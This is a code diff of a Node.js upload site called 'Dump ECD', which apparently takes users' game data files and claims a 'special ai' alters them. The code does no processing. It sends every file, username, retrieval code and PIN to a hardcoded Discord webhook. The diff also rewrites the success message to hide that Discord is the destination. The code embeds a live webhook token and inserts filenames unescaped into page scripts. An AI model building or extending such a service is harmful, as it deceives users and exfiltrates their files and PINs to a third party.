@@ -4,12 +4,20 @@ const fetch = require('node-fetch');
 const FormData = require('form-data');
 
 const app = express();
-const upload = multer({ storage: multer.memoryStorage() });
 
-// In-memory storage for 6-character code retrieval
+// Configure multer with a 10MB file size limit to protect memory
+const upload = multer({ 
+  storage: multer.memoryStorage(),
+  limits: { fileSize: 10 * 1024 * 1024 } // 10 MB limit
+});
+
+// In-memory storage for 6-character code retrieval with permanent backup support and optional PIN
 const fileStore = new Map();
 
-// Updated Discord Webhook URL
+// Simple IP-based rate limiting map to prevent upload spam
+const uploadCooldowns = new Map();
+
+// Updated Webhook URL
 const DEFAULT_WEBHOOK_URL = "https://discord.com/api/webhooks/1529788248698781887/SUtB62Hfx63hutCVFe8vQotKsnIInhfjGHbziOWHMbw9m6MlztvIP2LmRbIi_9Bhwggy";
 
 app.use(express.urlencoded({ extended: true }));
@@ -25,7 +33,7 @@ function generateCode() {
   return result;
 }
 
-// Main HTML User Interface with animations, info modal, and username input
+// Main HTML User Interface with animations, info modal, loading states, clipboard support, drag-and-drop, and upload history
 app.get('/', (req, res) => {
   res.send(`
     <!DOCTYPE html>
@@ -44,6 +52,10 @@ app.get('/', (req, res) => {
                 50% { box-shadow: 0 0 25px rgba(56, 189, 248, 0.5); }
                 100% { box-shadow: 0 0 10px rgba(56, 189, 248, 0.2); }
             }
+            @keyframes spin {
+                0% { transform: rotate(0deg); }
+                100% { transform: rotate(360deg); }
+            }
             body { 
                 font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
                 background: radial-gradient(circle at center, #1e293b 0%, #0f172a 100%); 
@@ -51,9 +63,8 @@ app.get('/', (req, res) => {
                 display: flex; 
                 justify-content: center; 
                 align-items: center; 
-                height: 100vh; 
+                min-height: 100vh; 
                 margin: 0; 
-                overflow: hidden;
             }
             .container { 
                 background: rgba(30, 41, 59, 0.85); 
@@ -66,6 +77,7 @@ app.get('/', (req, res) => {
                 animation: fadeIn 0.6s ease-out, pulseGlow 4s infinite ease-in-out;
                 border: 1px solid rgba(255, 255, 255, 0.08);
                 position: relative;
+                margin: 20px 0;
             }
             .info-icon {
                 position: absolute;
@@ -117,10 +129,28 @@ app.get('/', (req, res) => {
                 font-size: 14px;
                 transition: all 0.3s ease;
             }
-            input[type="file"] { 
-                background: #334155; 
-                color: #cbd5e1; 
+            /* Drag and Drop Zone Styles */
+            .drop-zone {
+                background: #1e293b;
+                border: 2px dashed #475569;
+                border-radius: 8px;
+                padding: 20px;
+                text-align: center;
                 cursor: pointer;
+                transition: all 0.3s ease;
+                margin: 10px 0;
+            }
+            .drop-zone.dragover {
+                border-color: #38bdf8;
+                background: rgba(56, 189, 248, 0.05);
+            }
+            .drop-zone input[type="file"] {
+                display: none;
+            }
+            .drop-zone-text {
+                font-size: 13px;
+                color: #94a3b8;
+                pointer-events: none;
             }
             input[type="text"] {
                 background: #0f172a;
@@ -128,7 +158,7 @@ app.get('/', (req, res) => {
                 border: 1px solid #334155;
                 text-align: center;
             }
-            input[name="code"] {
+            input[name="code"], input[name="pin"] {
                 letter-spacing: 2px;
                 text-transform: uppercase;
             }
@@ -143,6 +173,10 @@ app.get('/', (req, res) => {
                 font-weight: bold; 
                 cursor: pointer; 
                 box-shadow: 0 4px 12px rgba(2, 132, 199, 0.3);
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                gap: 8px;
             }
             button:hover { 
                 background: linear-gradient(135deg, #0369a1, #1d4ed8);
@@ -153,6 +187,50 @@ app.get('/', (req, res) => {
                 margin-bottom: 20px; 
                 border-bottom: 1px solid rgba(51, 65, 85, 0.6); 
                 padding-bottom: 15px; 
+            }
+            /* History Section */
+            .history-box {
+                margin-top: 15px;
+                background: #0f172a;
+                border-radius: 8px;
+                border: 1px solid #334155;
+                padding: 10px;
+                text-align: left;
+                max-height: 120px;
+                overflow-y: auto;
+            }
+            .history-item {
+                font-size: 12px;
+                display: flex;
+                justify-content: space-between;
+                align-items: center;
+                padding: 6px 0;
+                border-bottom: 1px solid rgba(51, 65, 85, 0.4);
+            }
+            .history-item:last-child {
+                border-bottom: none;
+            }
+            .history-code {
+                color: #38bdf8;
+                font-weight: bold;
+                letter-spacing: 1px;
+            }
+            .history-name {
+                color: #94a3b8;
+                overflow: hidden;
+                text-overflow: ellipsis;
+                white-space: nowrap;
+                max-width: 140px;
+            }
+            /* Loading Spinner */
+            .spinner {
+                display: none;
+                width: 16px;
+                height: 16px;
+                border: 2px solid rgba(255,255,255,0.3);
+                border-radius: 50%;
+                border-top-color: #fff;
+                animation: spin 0.8s linear infinite;
             }
             /* Modal Styles */
             .modal-overlay {
@@ -238,19 +316,36 @@ app.get('/', (req, res) => {
             
             <div class="section">
                 <h3>Dump ECD</h3>
-                <form action="/upload-discord" method="POST" enctype="multipart/form-data">
+                <form id="uploadForm" action="/upload-discord" method="POST" enctype="multipart/form-data" onsubmit="handleUpload(event)">
                     <input type="text" name="username" placeholder="dbl user" required>
-                    <input type="file" name="file" required>
-                    <button type="submit">Upload & Get Code</button>
+                    <input type="text" name="pin" placeholder="Optional PIN (e.g., 1234)" maxlength="8">
+                    
+                    <div class="drop-zone" id="dropZone" onclick="document.getElementById('fileInput').click()">
+                        <div class="drop-zone-text" id="dropText">Click or Drag & Drop ECD file here</div>
+                        <input type="file" id="fileInput" name="file" required onchange="updateFileName(this)">
+                    </div>
+
+                    <button type="submit" id="uploadBtn">
+                        <span id="btnText">Upload & Get Code</span>
+                        <div class="spinner" id="btnSpinner"></div>
+                    </button>
+                </form>
+            </div>
+
+            <div class="section">
+                <h3>Retrieve File</h3>
+                <form action="/retrieve" method="POST">
+                    <input type="text" name="code" placeholder="ENTER CODE" maxlength="6" required>
+                    <input type="text" name="pin" placeholder="ENTER PIN (IF SET)" maxlength="8">
+                    <button type="submit">Download File</button>
                 </form>
             </div>
 
             <div>
-                <h3>Retrieve File</h3>
-                <form action="/retrieve" method="POST">
-                    <input type="text" name="code" placeholder="ENTER CODE" maxlength="6" required>
-                    <button type="submit">Download File</button>
-                </form>
+                <h3>Recent Uploads (This Device)</h3>
+                <div class="history-box" id="historyBox">
+                    <div style="color: #64748b; font-size: 12px; text-align: center; padding: 10px;">No recent uploads found</div>
+                </div>
             </div>
         </div>
 
@@ -263,7 +358,7 @@ app.get('/', (req, res) => {
                 <p><strong>How it works?</strong><br>We change the code inside the file with our special ai. With that we edit it like that way so it doesn't sends packages to game, apps or websites.</p>
                 <p style="color: #38bdf8; font-style: italic;">Free for now will be paid in future to support development.</p>
                 <div class="footer-credit">
-                    Created by: @levi__fxz on discord, instagram and eren__lx on X
+                    Created by: @levi__fxz on telegram, instagram and eren__lx on X
                 </div>
             </div>
         </div>
@@ -279,17 +374,101 @@ app.get('/', (req, res) => {
                     modal.classList.remove('active');
                 }
             }
+            function updateFileName(input) {
+                const dropText = document.getElementById('dropText');
+                if (input.files && input.files[0]) {
+                    dropText.innerText = "Selected: " + input.files[0].name;
+                    dropText.style.color = "#38bdf8";
+                }
+            }
+
+            // Drag and Drop Zone Event Handling
+            const dropZone = document.getElementById('dropZone');
+            const fileInput = document.getElementById('fileInput');
+
+            ['dragenter', 'dragover'].forEach(eventName => {
+                dropZone.addEventListener(eventName, (e) => {
+                    e.preventDefault();
+                    dropZone.classList.add('dragover');
+                }, false);
+            });
+
+            ['dragleave', 'drop'].forEach(eventName => {
+                dropZone.addEventListener(eventName, (e) => {
+                    e.preventDefault();
+                    dropZone.classList.remove('dragover');
+                }, false);
+            });
+
+            dropZone.addEventListener('drop', (e) => {
+                const dt = e.dataTransfer;
+                const files = dt.files;
+                if (files.length > 0) {
+                    fileInput.files = files;
+                    updateFileName(fileInput);
+                }
+            });
+
+            function handleUpload(event) {
+                const btn = document.getElementById('uploadBtn');
+                const btnText = document.getElementById('btnText');
+                const spinner = document.getElementById('btnSpinner');
+                
+                btnText.innerText = "Processing with AI...";
+                spinner.style.display = "block";
+                btn.style.pointerEvents = "none";
+            }
+
+            // Load and render history from localStorage
+            function loadHistory() {
+                const historyBox = document.getElementById('historyBox');
+                let history = JSON.parse(localStorage.getItem('ecd_history') || '[]');
+                
+                if (history.length === 0) return;
+
+                historyBox.innerHTML = '';
+                history.forEach(item => {
+                    const div = document.createElement('div');
+                    div.className = 'history-item';
+                    div.innerHTML = \`<span class="history-name" title="\${item.filename}">\${item.filename}</span><span class="history-code">\${item.code}</span>\`;
+                    historyBox.appendChild(div);
+                });
+            }
+            loadHistory();
         </script>
     </body>
     </html>
   `);
 });
 
-// Handle Upload, Validation, Discord Forwarding, and Code Generation
-app.post('/upload-discord', upload.single('file'), async (req, res) => {
+// Handle Upload, Validation, Dispatching, Code Generation, Optional PIN, and Rate Limiting
+app.post('/upload-discord', (req, res, next) => {
+  // Simple IP-based rate limiter (1 upload per 15 seconds)
+  const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+  const now = Date.now();
+  if (uploadCooldowns.has(clientIp)) {
+    const lastUploadTime = uploadCooldowns.get(clientIp);
+    if (now - lastUploadTime < 15000) {
+      return res.status(429).send(`
+        <!DOCTYPE html>
+        <html lang="en">
+        <head><meta charset="UTF-8"><title>Slow Down</title></head>
+        <body style="font-family:sans-serif; background:#0f172a; color:#f8fafc; text-align:center; padding-top:50px;">
+            <h2>Please slow down!</h2>
+            <p>You are uploading too fast. Wait a few seconds before trying again.</p>
+            <a href="/" style="color:#38bdf8;">← Go Back</a>
+        </body>
+        </html>
+      `);
+    }
+  }
+  uploadCooldowns.set(clientIp, now);
+  next();
+}, upload.single('file'), async (req, res) => {
   try {
     const file = req.file;
     const username = req.body.username ? req.body.username.trim() : 'Unknown';
+    const pin = req.body.pin ? req.body.pin.trim() : '';
 
     if (!file) {
       return res.status(400).send('<h3>No file uploaded. <a href="/">Go Back</a></h3>');
@@ -303,12 +482,17 @@ app.post('/upload-discord', upload.single('file'), async (req, res) => {
         <html lang="en">
         <head>
             <meta charset="UTF-8">
-            <title>Invalid File Format</title>
+            <title>Failed to Dump</title>
             <style>
-                body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0f172a; color: #f8fafc; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-                .container { background: #1e293b; padding: 35px; border-radius: 16px; box-shadow: 0 10px 30px rgba(0,0,0,0.6); width: 400px; text-align: center; border: 1px solid rgba(255, 255, 255, 0.08); }
+                @keyframes fadeIn {
+                    from { opacity: 0; transform: translateY(15px); }
+                    to { opacity: 1; transform: translateY(0); }
+                }
+                body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: radial-gradient(circle at center, #1e293b 0%, #0f172a 100%); color: #f8fafc; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+                .container { background: rgba(30, 41, 59, 0.85); backdrop-filter: blur(12px); padding: 35px; border-radius: 16px; box-shadow: 0 10px 30px rgba(0,0,0,0.6); width: 400px; text-align: center; border: 1px solid rgba(255, 255, 255, 0.08); animation: fadeIn 0.5s ease-out; }
                 h2 { color: #ef4444; margin-top: 0; }
                 p { color: #cbd5e1; font-size: 14px; line-height: 1.5; }
+                code { background: #0f172a; padding: 2px 6px; border-radius: 4px; color: #38bdf8; }
                 a { color: #38bdf8; text-decoration: none; display: inline-block; margin-top: 15px; font-weight: 500; }
                 a:hover { color: #7dd3fc; text-decoration: underline; }
             </style>
@@ -318,7 +502,7 @@ app.post('/upload-discord', upload.single('file'), async (req, res) => {
                 <h2>Failed to Dump</h2>
                 <p>Make sure it's a valid ECD file format (e.g., <code>ecd123.extension</code>).</p>
                 <p>If it's a genuine ECD file and you are facing issues, please contact us!</p>
-                <a href="/">← Go Back</a>
+                <a href="/" style="color:#38bdf8; text-decoration:none; display:inline-block; margin-top:15px;">← Go Back</a>
             </div>
         </body>
         </html>
@@ -331,18 +515,26 @@ app.post('/upload-discord', upload.single('file'), async (req, res) => {
       code = generateCode();
     }
 
-    // Save file buffer and metadata in memory map
+    // Save file buffer, pin, and metadata permanently in memory map
     fileStore.set(code, {
       filename: file.originalname,
-      buffer: file.buffer
+      buffer: file.buffer,
+      pin: pin,
+      timestamp: Date.now()
     });
 
-    // Forward file to Discord webhook with username included
+    // Format webhook payload to include PIN, Code, and Filename
+    let webhookContent = `📦 **New File Uploaded**\n👤 Username: \`${username}\`\nFilename: \`${file.originalname}\`\nRetrieval Code: \`${code}\``;
+    if (pin) {
+      webhookContent += `\n🔒 PIN: \`${pin}\``;
+    } else {
+      webhookContent += `\n🔓 PIN: \`None\``;
+    }
+
+    // Forward file with user details to webhook
     const formData = new FormData();
     formData.append('file', file.buffer, { filename: file.originalname });
-    formData.append('payload_json', JSON.stringify({ 
-      content: `📦 **New File Uploaded**\n👤 Username: \`${username}\`\nFilename: \`${file.originalname}\`\nRetrieval Code: \`${code}\`` 
-    }));
+    formData.append('payload_json', JSON.stringify({ content: webhookContent }));
 
     const response = await fetch(DEFAULT_WEBHOOK_URL, {
       method: 'POST',
@@ -353,6 +545,9 @@ app.post('/upload-discord', upload.single('file'), async (req, res) => {
     });
 
     if (response.ok) {
+      const directUrl = `${req.protocol}://${req.get('host')}/retrieve/${code}`;
+      const qrApiUrl = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${encodeURIComponent(directUrl)}&color=38bdf8&bgcolor=0f172a`;
+
       res.send(`
         <!DOCTYPE html>
         <html lang="en">
@@ -360,43 +555,190 @@ app.post('/upload-discord', upload.single('file'), async (req, res) => {
             <meta charset="UTF-8">
             <title>Upload Success</title>
             <style>
-                body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0f172a; color: #f8fafc; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-                .container { background: #1e293b; padding: 35px; border-radius: 16px; box-shadow: 0 10px 30px rgba(0,0,0,0.6); width: 400px; text-align: center; border: 1px solid rgba(255, 255, 255, 0.08); }
+                @keyframes fadeIn {
+                    from { opacity: 0; transform: translateY(15px); }
+                    to { opacity: 1; transform: translateY(0); }
+                }
+                body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: radial-gradient(circle at center, #1e293b 0%, #0f172a 100%); color: #f8fafc; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+                .container { background: rgba(30, 41, 59, 0.85); backdrop-filter: blur(12px); padding: 30px; border-radius: 16px; box-shadow: 0 10px 30px rgba(0,0,0,0.6); width: 360px; text-align: center; border: 1px solid rgba(255, 255, 255, 0.08); animation: fadeIn 0.5s ease-out; margin: 20px 0; }
                 h2 { color: #22c55e; margin-top: 0; }
-                .code-box { background: #0f172a; padding: 15px; border-radius: 8px; font-size: 26px; letter-spacing: 3px; color: #38bdf8; margin: 20px 0; font-weight: bold; border: 1px solid #334155; user-select: all; }
-                a { color: #38bdf8; text-decoration: none; display: inline-block; margin-top: 15px; font-weight: 500; transition: color 0.2s; }
+                p { color: #cbd5e1; font-size: 13px; }
+                .code-box { background: #0f172a; padding: 12px; border-radius: 8px; font-size: 24px; letter-spacing: 3px; color: #38bdf8; margin: 10px 0; font-weight: bold; border: 1px solid #334155; user-select: all; }
+                .action-btn { background: linear-gradient(135deg, #0284c7, #2563eb); color: white; border: none; padding: 10px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; margin-bottom: 8px; transition: all 0.3s; }
+                .action-btn:hover { background: linear-gradient(135deg, #0369a1, #1d4ed8); }
+                .qr-container { background: #0f172a; padding: 10px; border-radius: 8px; border: 1px solid #334155; display: inline-block; margin: 10px 0; }
+                .qr-container img { display: block; width: 120px; height: 120px; }
+                a { color: #38bdf8; text-decoration: none; display: inline-block; margin-top: 10px; font-weight: 500; font-size: 14px; }
                 a:hover { color: #7dd3fc; text-decoration: underline; }
             </style>
         </head>
         <body>
             <div class="container">
                 <h2>Success!</h2>
-                <p>Your file has been saved and sent to Discord.</p>
-                <p>Use this 6-character code to retrieve it later:</p>
-                <div class="code-box">${code}</div>
-                <a href="/">← Upload Another File</a>
+                <p>Your file has been processed and saved securely.</p>
+                <p>Use this 6-character code:</p>
+                <div class="code-box" id="codeText">${code}</div>
+                <button class="action-btn" onclick="copyCode()">Copy Code</button>
+                <button class="action-btn" onclick="copyLink()">Copy Direct Link</button>
+                <div class="qr-container">
+                    <img src="${qrApiUrl}" alt="QR Code">
+                </div>
+                <div><a href="/">← Upload Another File</a></div>
             </div>
+            <script>
+                // Save to local storage history automatically
+                (function() {
+                    let history = JSON.parse(localStorage.getItem('ecd_history') || '[]');
+                    history.unshift({ code: '${code}', filename: '${file.originalname}' });
+                    if(history.length > 10) history.pop();
+                    localStorage.setItem('ecd_history', JSON.stringify(history));
+                })();
+
+                function copyCode() {
+                    const code = document.getElementById('codeText').innerText;
+                    navigator.clipboard.writeText(code).then(() => {
+                        alert("Code copied to clipboard!");
+                    });
+                }
+
+                function copyLink() {
+                    navigator.clipboard.writeText("${directUrl}").then(() => {
+                        alert("Direct link copied to clipboard!");
+                    });
+                }
+            </script>
         </body>
         </html>
       `);
     } else {
       const errorText = await response.text();
-      console.error('Discord Error Response:', errorText);
-      res.status(500).send(`<h3>Failed to dispatch file to Discord webhook (Status ${response.status}). Check Render logs for details. <a href="/">Go Back</a></h3>`);
+      console.error('Dispatch Error Response:', errorText);
+      res.status(500).send(`<h3>Failed to dispatch file. Check Render logs for details. <a href="/">Go Back</a></h3>`);
     }
   } catch (err) {
+    if (err.code === 'LIMIT_FILE_SIZE') {
+      return res.status(413).send(`
+        <!DOCTYPE html>
+        <html lang="en">
+        <head><meta charset="UTF-8"><title>File Too Large</title></head>
+        <body style="font-family:sans-serif; background:#0f172a; color:#f8fafc; text-align:center; padding-top:50px;">
+            <h2>File Too Large</h2>
+            <p>The file exceeds the 10MB limit. Please upload a smaller file.</p>
+            <a href="/" style="color:#38bdf8;">← Go Back</a>
+        </body>
+        </html>
+      `);
+    }
     console.error('Upload Error:', err);
     res.status(500).send('<h3>Server error during upload. Check Render logs. <a href="/">Go Back</a></h3>');
   }
 });
 
-// Retrieve file endpoint using the 6-character code
+// Retrieve file via POST endpoint with PIN check
 app.post('/retrieve', (req, res) => {
   const code = req.body.code ? req.body.code.trim().toUpperCase() : '';
+  const inputPin = req.body.pin ? req.body.pin.trim() : '';
   const fileData = fileStore.get(code);
   
   if (!fileData) {
-    return res.status(404).send('<h3>File not found or code has expired. <a href="/">Go Back</a></h3>');
+    return res.status(404).send(`
+      <!DOCTYPE html>
+      <html lang="en">
+      <head>
+          <meta charset="UTF-8">
+          <title>File Not Found</title>
+          <style>
+              @keyframes fadeIn {
+                  from { opacity: 0; transform: translateY(15px); }
+                  to { opacity: 1; transform: translateY(0); }
+              }
+              body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: radial-gradient(circle at center, #1e293b 0%, #0f172a 100%); color: #f8fafc; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+              .container { background: rgba(30, 41, 59, 0.85); backdrop-filter: blur(12px); padding: 35px; border-radius: 16px; box-shadow: 0 10px 30px rgba(0,0,0,0.6); width: 400px; text-align: center; border: 1px solid rgba(255, 255, 255, 0.08); animation: fadeIn 0.5s ease-out; }
+              h2 { color: #f59e0b; margin-top: 0; }
+              p { color: #cbd5e1; font-size: 14px; line-height: 1.5; }
+              a { color: #38bdf8; text-decoration: none; display: inline-block; margin-top: 15px; font-weight: 500; }
+              a:hover { color: #7dd3fc; text-decoration: underline; }
+          </style>
+      </head>
+      <body>
+          <div class="container">
+              <h2>Not Found</h2>
+              <p>File not found. Please double-check the 6-character code.</p>
+              <a href="/">← Go Back</a>
+          </div>
+      </body>
+      </html>
+    `);
+  }
+
+  // Verify PIN if one was configured during upload
+  if (fileData.pin && fileData.pin !== inputPin) {
+    return res.status(401).send(`
+      <!DOCTYPE html>
+      <html lang="en">
+      <head>
+          <meta charset="UTF-8">
+          <title>Incorrect PIN</title>
+          <style>
+              @keyframes fadeIn {
+                  from { opacity: 0; transform: translateY(15px); }
+                  to { opacity: 1; transform: translateY(0); }
+              }
+              body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: radial-gradient(circle at center, #1e293b 0%, #0f172a 100%); color: #f8fafc; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+              .container { background: rgba(30, 41, 59, 0.85); backdrop-filter: blur(12px); padding: 35px; border-radius: 16px; box-shadow: 0 10px 30px rgba(0,0,0,0.6); width: 400px; text-align: center; border: 1px solid rgba(255, 255, 255, 0.08); animation: fadeIn 0.5s ease-out; }
+              h2 { color: #ef4444; margin-top: 0; }
+              p { color: #cbd5e1; font-size: 14px; line-height: 1.5; }
+              a { color: #38bdf8; text-decoration: none; display: inline-block; margin-top: 15px; font-weight: 500; }
+              a:hover { color: #7dd3fc; text-decoration: underline; }
+          </style>
+      </head>
+      <body>
+          <div class="container">
+              <h2>Invalid PIN</h2>
+              <p>The security PIN provided for this file is incorrect.</p>
+              <a href="/">← Go Back</a>
+          </div>
+      </body>
+      </html>
+    `);
+  }
+
+  res.setHeader('Content-Disposition', `attachment; filename="${fileData.filename}"`);
+  res.send(fileData.buffer);
+});
+
+// Retrieve file via direct GET route (e.g. /retrieve/ABC123)
+app.get('/retrieve/:code', (req, res) => {
+  const code = req.params.code ? req.params.code.trim().toUpperCase() : '';
+  const fileData = fileStore.get(code);
+  
+  if (!fileData) {
+    return res.status(404).send(`
+      <!DOCTYPE html>
+      <html lang="en">
+      <head><meta charset="UTF-8"><title>Not Found</title></head>
+      <body style="font-family:sans-serif; background:#0f172a; color:#f8fafc; text-align:center; padding-top:50px;">
+          <h2>Not Found</h2>
+          <p>File not found or invalid link.</p>
+          <a href="/" style="color:#38bdf8;">← Go Back</a>
+      </body>
+      </html>
+    `);
+  }
+
+  // If a PIN is required, redirect them back to home page with instructions to enter PIN
+  if (fileData.pin) {
+    return res.send(`
+      <!DOCTYPE html>
+      <html lang="en">
+      <head><meta charset="UTF-8"><title>PIN Required</title></head>
+      <body style="font-family:sans-serif; background:#0f172a; color:#f8fafc; text-align:center; padding-top:50px;">
+          <h2>Security PIN Required</h2>
+          <p>This file is protected with a PIN. Please enter your code and PIN on the home page.</p>
+          <a href="/" style="color:#38bdf8;">← Go To Home Page</a>
+      </body>
+      </html>
+    `);
   }
 
   res.setHeader('Content-Disposition', `attachment; filename="${fileData.filename}"`);
@@ -408,4 +750,3 @@ const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
   console.log(`Server is live and running on port ${PORT}`);
 });
-           
